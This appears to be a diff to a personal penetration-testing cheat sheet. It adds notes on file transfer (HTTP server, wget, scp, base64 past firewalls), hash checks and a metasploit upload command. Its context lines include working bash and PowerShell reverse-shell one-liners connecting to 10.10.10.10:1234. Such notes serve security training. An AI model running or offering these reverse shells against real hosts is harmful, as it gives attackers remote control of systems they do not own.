@@ -82,17 +82,56 @@ It is very informative.
 - 'dir -w' lets you specify a wordlist for a dictionary attack.
 - Theres many more flags that you can lookup by looking at the 'man' page.
 
+# EyeWitness
+- Eyewitness is a tool that lets you take screenshots of target web apps and also finger print them and identify credentials.
+
+# starting up a python http server.
+- 'python3 -m http.server <port>'
+- files in the folder are automatically treated as pages and can be grabbed using wget.
+
+## tools for downloading files
+# wget
+- 'wget <url/ip>'
+Tool that lets you download webpages or content off of webpages.
+- if the remote server doesn't have wget, you should use curl.
+
 # curl
 'curl <ip/url>'
 Tool that lets you download stuff from certain ports.
 - '-I' flag lets you grab the header of an HTTP IMAP or SMTP protocol port.
 - '-L' flag. In case the server redirects (as indicated per a 3xx code), this flag lets curl follow the redirect.
 
-# EyeWitness
-- Eyewitness is a tool that lets you take screenshots of target web apps and also finger print them and identify credentials.
+# scp
+SCP is a tool tat can let you download files over an ssh connection.
+- 'scp <localfile> user@remotehost:/path/<localfile>'
+
+# base64
+In some cases, we may not be able to transfer files over the connection (IE remote host has a firewall) in which case we can encode the file using base64 and then paste and decode it on the server.
+- 'base64 <file> -w 0'
+- -w is a flag that lets you wrap the file after the COLS character. setting it to 0 disables wrapping.
+
+## Validating file transfers
+# file tool
+To validate the format of a file you can run the file command on it.
+- 'file <file>'
+
+# md5sum 
+md5sum is a tool that lets you run a hashing function on a file. If the hashes match, then the filetransfer is correct.
+
+md5sum is a bit outdated for encrypting files.
+
+- 'md5sum <file>'
+
+# sha256
+another file validation hash function.
+- 'sha256sum <file>'
+
+
+
+
 
 # whatweb
-'whatweb <ip>'
+a'whatweb <ip>'
 - Lets you pinpoint the exact tech that runs on the webserver.
 - Very useful.
 - Has a lot more functionality that lets you automate website enumeration across a network.
@@ -106,6 +145,7 @@ Tool that lets you download stuff from certain ports.
 - the 'set <option> <input>' lets you set settings.
 - 'exploit' lets you actually run the exploit
 - The 'check' command lets you see if a server is vulnerable.
+- 'Upload' command lets you upload a file to the remote host
 
 # IP
 - Your IP can be found using the following command.
@@ -122,7 +162,8 @@ A few standard commands are
 ## Also bash
 - rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
 ## Powershell
--  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()" 
+-  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
 
 
-We can use the exploit we have over a remote host to execute one of these commands. (IE through python or a metasploit module) to get a reverse connection
+- We can use the exploit we have over a remote host to execute one of these commands. (IE through python or a metasploit module) to get a reverse connection
+
